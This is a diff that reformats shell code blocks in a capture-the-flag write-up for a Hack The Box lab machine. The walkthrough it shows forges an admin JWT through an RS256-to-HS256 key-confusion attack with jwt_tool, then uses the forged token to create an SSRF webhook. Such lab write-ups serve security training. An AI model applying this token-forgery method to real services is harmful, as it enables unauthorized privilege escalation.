@@ -18,16 +18,16 @@ Navigating to the link itself just gets us a blank page. But if we go to the bas
 ```
 
 First lets try the `GET /webhooks` endpoint. Since the other endpoints need a UUID it might help to see which ones have already been created. 
-```bash
-curl http://webhooks-api-beta.cybermonday.htb/webhooks
+```shell
+$ curl http://webhooks-api-beta.cybermonday.htb/webhooks
 
 {"status":"error","message":"Unauthorized"}
 ```
 
 
 So we need authorization for this one. The same seems to be true for the create endpoint. We have the UUID for the webhook from the changelog so lets `POST` to that and see what happens.
-```bash
-curl -X POST http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77 -H "Content-Type: application/json" -d '{}'
+```shell
+$ curl -X POST http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77 -H "Content-Type: application/json" -d '{}'
 
 {"status":"error","message":"\"log_name\" not defined"}
 ```
@@ -50,19 +50,19 @@ The login endpoint has a username and password so lets try some [[weak-credentia
 So our role may be what's holding us back here. Since the security algorithm is RS256 the server may be open to an [[jwt-exploits|algorithm switching attack]]. First we need the public key our token. Querying the usual paths on the server we find the information in the `/jwks.json` path. From that we can extract the public key. Next we use `jwt_tool` to alter the payload and resign the token. 
 
 First we'll extract the public key from the `jwks.json` file, then tamper with the payload and signature.
-```bash
-python3 ~/tools/jwt_tool/jwt_tool.py <your token> -V -jw jwks.json
+```shell
+$ python3 ~/tools/jwt_tool/jwt_tool.py <your token> -V -jw jwks.json
 
 Found RSA key factors, generating a public key
 [+] kid_0_<timestamp>.pem
 
-python3 ~/tools/jwt_tool/jwt_tool.py <your token> -T
-python3 ~/tools/jwt_tool/jwt_tool.py <token from the above command> -X k -pk <your pem filename>
+$ python3 ~/tools/jwt_tool/jwt_tool.py <your token> -T
+$ python3 ~/tools/jwt_tool/jwt_tool.py <token from the above command> -X k -pk <your pem filename>
 ```
 
 During the second command `jwt_tool` will ask what data you want to tamper with. Skip the header values, then change the `role` value in the payload to `admin`. After this you should have a new (much shorter) JWT that we can now try using to create a new webhook.
-```bash
-curl -X POST http://webhooks-api-beta.cybermonday.htb/webhooks/create \
+```shell
+$ curl -X POST http://webhooks-api-beta.cybermonday.htb/webhooks/create \
 -H "x-access-token: <your spoofed token>" \
 -H "Content-Type: application/json" \
 -d '{"description": "ssrf", "name": "ssrfHook", "action": "sendRequest"}'
